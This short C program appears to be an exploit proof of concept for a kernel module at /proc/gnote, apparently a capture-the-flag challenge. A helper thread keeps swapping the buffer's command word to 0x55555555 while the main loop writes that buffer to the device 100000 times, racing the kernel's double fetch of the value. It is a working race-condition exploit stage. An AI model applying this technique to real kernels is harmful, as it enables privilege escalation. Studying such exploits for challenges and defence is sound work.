#include<unistd.h>
#include<fcntl.h>
#include<pthread.h>
#include<stdio.h>

#define FAKE "0x55555555"

void* thread_func(void* arg) {
//just repeat xchg $rbx $rax(==0x55555555)
    printf("...repeating xchg $rbx $0x55555555\n");
    asm volatile("mov $" FAKE ", %%eax\n"
                 "mov %0, %%rbx\n"
                 "lbl:\n"
                 "xchg (%%rbx), %%eax\n"
                 "jmp lbl\n"
                 :
                 : "r" (arg)
                 : "rax", "rbx"
                 );
    return 0;
}

int main(void) {
    int fd = open("/proc/gnote", O_RDWR);
    if(fd<=0){
      printf("open error\n");
      return 1;
    }
    unsigned int buf[2] = {0, 0x10001};

    pthread_t thr;
    pthread_create(&thr, 0, thread_func, &buf[0]);

    for(int ix=0;ix!=100000;++ix){
      printf("try :%d\n",ix);
      write(fd, buf, sizeof(buf));
    }

    return 0;
}

